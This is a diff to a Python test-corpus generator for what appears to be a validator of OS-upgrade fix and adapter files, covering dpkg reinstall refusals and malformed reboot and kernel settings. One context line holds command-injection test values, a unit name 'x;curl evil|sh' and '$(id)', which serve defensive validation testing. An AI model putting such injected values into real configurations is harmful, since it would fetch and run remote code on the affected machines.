@@ -181,6 +181,16 @@ def type_corpus():
             {"op": "service.enable", "unit": "x;curl evil|sh", "like": ["$(id)"]}]}, "adapters": loose,
             "where": WH, "fixes": []})
 
+    for hop, ph, refused in (("lenny", "pre", True), ("lenny", "post", True),
+                              ("squeeze", "pre", True), ("squeeze", "post", False),
+                              ("wheezy", "pre", False)):
+        d = {"schema": "wend.fix/0", "family": "debian", "hop": hop,
+             "when": {"installed": "dpkg"}, ph: [{"op": "dpkg.reinstall", "packages": ["dpkg"]}],
+             "meta": {"name": "x"}}
+        wh = f"fixes/debian/{hop}/x.toml"
+        assert bool(check.check_fix(d, adapters, wh)) == refused
+        out.append({"label": f"dpkg.reinstall {hop} {ph}", "kind": "fix", "doc": d,
+                    "adapters": adapters, "where": wh, "fixes": []})
     S = lambda **kw: (lambda d: d.update(**kw))  # noqa: E731
     P = lambda *steps: (lambda d: d.update(post=list(steps)))  # noqa: E731
     fix("baseline", lambda d: None)
@@ -270,6 +280,14 @@ def type_corpus():
     adapter("hardware old_kernels unknown", lambda a: a["hardware"].update(old_kernels="all"))
     adapter("hardware old_kernels a list", lambda a: a["hardware"].update(old_kernels=["running"]))
     adapter("hardware boot_mib absent", lambda a: a["hardware"]["alma9"].pop("boot_mib"))
+    adapter("bad reboot", lambda a: a["releases"]["centos6"].update(reboot="after-post"))
+    adapter("nonstring reboot", lambda a: a["releases"]["centos6"].update(reboot=True))
+    for k in ("kernel_before", "kernel_after"):
+        adapter(k + " string", lambda a, k=k: a["hop"].update({k: "true"}))
+        adapter(k + " mixed list", lambda a, k=k: a["hop"].update({k: [1]}))
+        for i in range(len(adapters["el"]["hop"][k])):
+            adapter(k + f" guard {i}", lambda a, k=k, i=i: a["hop"][k].__setitem__(
+                i, a["hop"][k][i].replace("[ / -ef /proc/1/root ] || ", "", 1)))
     adapter("transit boot_mib absent", lambda a: a["releases"]["alma8"]["transit"].pop("boot_mib"))
     adapter("transit boot_mib zero", lambda a: a["releases"]["alma8"]["transit"].update(boot_mib=0))
     adapter("hardware boot_mib a float", lambda a: a["hardware"]["alma9"].update(boot_mib=70.5))
